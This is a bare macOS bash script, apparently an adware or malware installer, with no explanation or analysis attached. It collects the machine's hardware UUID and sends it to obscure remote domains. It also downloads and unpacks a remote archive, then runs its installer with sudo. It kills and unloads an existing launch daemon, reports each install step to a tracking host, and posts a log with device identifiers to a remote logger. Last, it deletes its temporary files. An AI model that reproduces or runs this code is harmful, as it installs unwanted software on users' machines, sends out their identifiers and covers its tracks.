#!/bin/bash
# ioreg -l | grep -e Manufacturer -e 'Vendor Name'
updFile="/var/tmp/updText.txt"
updFileError="/var/tmp/updTextError.txt"
chmod 777 $updFile;
chmod 777 $updFileError;
echo > $updFile
echo > $updFileError
br_mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ { split($0, line, "\""); printf("%s\n", line[4]); }')
midFile=$(find /System/Library/Frameworks -type f -name "*.uuid.plist" -print0 | xargs -0 ls -tl | sort -n | tail -1 | awk '{print $9}')
if [ -e "$midFile" ]; then
    mid=$(echo "$midFile" | python -c 'import sys;print open(sys.stdin.read().rstrip(), "r").read().split("<string>")[1].split("</string>")[0]')
    echo "mid: $mid." >> $updFile
fi
get_pd_client_data="http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=$br_mid&ct=pd"
data=$(curl -s "$get_pd_client_data")
dc="PP81824a7e058cd13d-0-NM-IT"
channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)
pdChannel=${dc:2}
echo "DC: $dc" >> $updFile
click_id="0"
echo "CLICK_ID: $click_id" >> $updFile
click_stamp="62d9a6ba-8f26-4dbb-8461-6b0780218af5"
echo "CLICK_STAMP: $click_stamp" >> $updFile
id=$dc"--"$click_id"___"$click_stamp"___"$br_mid
echo "Full ID: $id" >> $updFile
domain=""http://aa9d046aab36af4ff182f097f840430d51.com""
pop_url="'http://aa9d046aab36af4ff182f097f840430d51.com/pp/fd?re=1&uid=[MACHINE_ID]&u=[CONTEXT_URL]'"
pop_delay="1"

if [ $midFile ]; then
	frm=$(echo $midFile | tail -1 | awk -F "/" '{print $5}' | awk -F "." '{print $1}')
fi
mid_proc=false
if [ $frm ];then
	if ps -ef | grep -v grep | grep -q $frm; then
		mid_proc=true
	fi
fi
echo "midFile: $midFile." >> $updFile
echo "frm: $frm" >> $updFile
echo "mid_proc: $mid_proc" >> $updFile

pClt () {
	updFile="/var/tmp/updText.txt"
	sudo chmod 777 $updFile
	echo "Starting Client Updater Script" >> $updFile
	oldAppName=$(sudo defaults read /Library/Preferences/com.common.plist name_upd)
	echo "Killing old clt: $oldAppName" >> $updFile
	sudo killall $oldAppName
	sudo launchctl unload -w "/Library/LaunchDaemons/com."$oldAppName".plist"
	shouldInstall=1
	if [ $oldAppName ]; then
		procName=$(ps -ef | grep $oldAppName | grep -v grep | sort -n | tail -1 | awk '{print  $8}' | awk -F "/" '{print $6}')
		if [[ $procName ]]; then
			shouldInstall=0
		fi
	fi
	if (( $shouldInstall == 1 )); then
		echo "Installing Client Updater" >> $updFile
		tmpfile88="/var/tmp/DemoUpdater"
		tmpfile77="/var/tmp/upd_o.txt"
		tmpfile66="/var/tmp/dut8.tgz"
		/usr/bin/curl -s -L -o $tmpfile66 "http://pullmenow.com/pd_files/dut8.tgz"
		sleep 5
		tar -xzf $tmpfile66 -C /var/tmp/
		sudo chmod 777 $tmpfile88/install_updater.sh
		/usr/bin/curl -s -L -o $tmpfile77 -G "http://t.trkitok.com/track/rep?oid=7000&st=1" --data-urlencode "id=$id"
		sudo chmod 777 "/var/tmp/updText.txt"
		sudo $tmpfile88/install_updater.sh $dc"---"$mid "$click_id___"$click_stamp "$domain"
		sleep 30
		/usr/bin/curl -s -L -o $tmpfile77 -G "http://t.trkitok.com/track/rep?oid=7000&st=2" --data-urlencode "id=$id"
		sleep 5
		rm -rf $tmpfile77
		rm -rf $tmpfile66
		rm -rf $tmpfile88
	else
		echo "Not Installing Client Updater" >> $updFile
	fi
	echo "Finished Client Updater Script." >> $updFile
}

shouldPDClt="1"
echo $shouldPDClt
if [[ $mid_proc = false && "$shouldPDClt" == "1" ]]; then
	echo "vs_clt_no_mid" >> $updFile
	echo "Installing pClt with logger" >> $updFile
	pClt &> $updFileError;
	sleep 10
	echo $(</var/tmp/updTextError.txt) >> $updFile
else
	echo "vs_clt_mid: $mid" >> $updFile
fi

eventType="Update Script Output"
sleep 30
curl --request POST 'http://93a555685cc7443a8e1034efa1f18924.com/v/pd-logger' --data "vs_mid=$mid" --data "br_mid=$br_mid" --data-urlencode "event_type=$eventType" --data-urlencode "event_data=$(<$updFile)"
sleep 5
rm -rf $updFile
rm -rf /var/tmp/updText2.txt
rm -rf $updFileError